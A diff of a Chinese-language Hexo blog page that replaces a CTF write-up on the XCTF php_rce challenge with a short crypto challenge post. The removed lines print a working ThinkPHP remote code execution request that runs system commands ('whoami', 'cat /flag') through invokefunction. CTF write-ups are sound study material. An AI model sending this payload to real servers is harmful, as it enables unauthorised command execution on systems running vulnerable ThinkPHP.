@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Web2, lunan">
+    <meta name="keywords" content="Crypto3, lunan">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Web2 | lunan</title>
+    <title>Crypto3 | lunan</title>
     <link rel="icon" type="image/png" href="/lunan0320.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/lunan0320.github.io/libs/awesome/css/all.css">
@@ -29,10 +29,10 @@
 
     <script src="/lunan0320.github.io/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/lunan0320.github.io/atom.xml" title="lunan" type="application/atom+xml">
+<link rel="stylesheet" href="/lunan0320.github.io/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/lunan0320.github.io/atom.xml" title="lunan" type="application/atom+xml">
-<link rel="stylesheet" href="/lunan0320.github.io/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 <script type="text/javascript">
     var OriginTitile=document.title,st;
@@ -262,12 +262,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/lunan0320.github.io/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Web2</h1>
+                    <h1 class="description center-align post-title">Crypto3</h1>
                 </div>
             </div>
         </div>
@@ -383,8 +383,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/lunan0320.github.io/tags/Web/">
-                                <span class="chip bg-color">Web</span>
+                            <a href="/lunan0320.github.io/tags/Crypto/">
+                                <span class="chip bg-color">Crypto</span>
                             </a>
                         
                     </div>
@@ -399,7 +399,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-17
+                    2021-01-01
                 </div>
                 
 
@@ -413,7 +413,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    208
+                    68
                 </div>
                 
 
@@ -440,19 +440,11 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p>
-<p><img src="/lunan0320.github.io/2021/01/17/web2/1.png"></p>
-<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre>
-<p>返回的结果是：</p>
-<p>​    <img src="/lunan0320.github.io/2021/01/17/web2/2.png"></p>
-<p>同样，在比较了很多的较为繁琐的解决方法后，我找到了一种适合该题的一种较为简单的方法。</p>
-<p>我们可以根据在linux系统下的命令行输入语法来执行此过程寻找flag，可以有更方便的查找文件的命令：</p>
-<pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>name <span class="token string">"*flag*"</span></code></pre>
-<p>此时可以输入：</p>
-<pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag</code></pre>
-<p>作为后缀，来寻找flag</p>
-<p>查找结果如图：</p>
-<p><img src="/lunan0320.github.io/2021/01/17/web2/3.png"></p>
+                <h1 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h1><p>Easychallenge wp😊</p>
+<p>题目来源：攻防世界—crypto  </p>
+<p>下载附件，我们发现是一个.pyc文件，我们找个在线反编译网站，反编译出如下python代码：</p>
+<p><img src="/lunan0320.github.io/2021/01/01/crypto3/1.png"></p>
+<p>然后理清变换过程，写出得到flag的程序，就可以的到flag了。</p>
 
                 
             </div>
@@ -479,7 +471,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/17/web2/">https://lunan0320.github.io/lunan0320.github.io/2021/01/17/web2/</a>
+                    <a href="https://lunan0320.github.io/lunan0320.github.io/2021/01/01/crypto3/">https://lunan0320.github.io/lunan0320.github.io/2021/01/01/crypto3/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -517,8 +509,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/lunan0320.github.io/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
+                                <a href="/lunan0320.github.io/tags/Crypto/">
+                                    <span class="chip bg-color">Crypto</span>
                                 </a>
                             
                         </div>
@@ -562,12 +554,11 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/17/web2/">
+                <a href="/lunan0320.github.io/2021/01/01/web2/">
                     <div class="card-image">
                         
                         
@@ -583,9 +574,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-17
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-01
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -594,7 +585,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -613,13 +603,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/lunan0320.github.io/2021/01/17/web1/">
+                <a href="/lunan0320.github.io/2020/12/28/re2/">
                     <div class="card-image">
                         
                         
-                        <img src="/lunan0320.github.io/medias/featureimages/5.jpg" class="responsive-img" alt="Web1">
+                        <img src="/lunan0320.github.io/medias/featureimages/7.jpg" class="responsive-img" alt="re2">
                         
-                        <span class="card-title">Web1</span>
+                        <span class="card-title">re2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -630,7 +620,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-28
                             </span>
                         <span class="publish-author">
                             
@@ -643,8 +633,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/lunan0320.github.io/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/lunan0320.github.io/tags/Reverse/">
+                        <span class="chip bg-color">Reverse</span>
                     </a>
                     
                 </div>
@@ -884,7 +874,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.9k</span>&nbsp;字
+                class="white-color">2k</span>&nbsp;字
             
             
             
